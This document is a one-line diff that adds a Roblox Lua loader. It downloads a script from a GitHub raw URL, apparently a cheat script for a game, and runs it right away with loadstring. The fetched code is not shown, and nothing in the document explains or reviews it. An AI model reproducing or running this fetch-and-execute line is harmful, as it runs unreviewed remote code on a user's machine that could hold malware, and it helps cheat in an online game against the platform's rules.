@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/clean-all-the-leaves-spam7-51yjrra6ocfcr0.lua"))()
